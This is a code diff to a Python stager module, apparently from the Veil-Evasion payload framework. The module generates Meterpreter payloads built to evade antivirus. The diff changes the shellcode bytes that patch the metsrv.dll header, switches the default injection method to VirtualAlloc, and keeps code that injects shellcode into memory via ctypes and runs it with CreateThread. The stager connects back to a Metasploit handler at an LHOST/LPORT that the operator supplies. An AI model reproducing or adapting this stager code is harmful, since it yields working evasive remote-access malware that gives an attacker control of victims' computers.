@@ -9,7 +9,7 @@ Concept and module by @the_grayhound
 
 """
 
-import struct, string, random, sys
+import struct, string, random, sys, os
 
 from modules.common import messages
 from modules.common import randomizer
@@ -32,7 +32,7 @@ class Stager:
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                "inject_method" : ["void", "[virtual]alloc or [void]pointer"],
+                                "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["", "Port of the metasploit handler"]}
         
@@ -59,8 +59,11 @@ class Stager:
                     
     def generate(self):
         
-        metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
-        
+        if os.path.exists(settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"):
+            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.x86.dll"
+        else:
+            metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
+            
         f = open(metsrvPath, 'rb')
         meterpreterDll = f.read()
         f.close()
@@ -69,9 +72,8 @@ class Stager:
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
         # patch the metsrv.dll header
-
-        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\x37"
-        headerPatch += "\x15\x00\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
+        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xb0"
+        headerPatch += "\x0e\x00\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
         headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
         meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
 
@@ -151,8 +153,6 @@ class Stager:
             payloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + randPtr + '),' + randBuf + ',ctypes.c_int(len(' + randVarName + ')))\n'
             payloadCode += randHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + randPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
             payloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + randHt + '),ctypes.c_int(-1))\n'
-
-
 
         
         if self.required_options["use_pyherion"][0].lower() == "y":
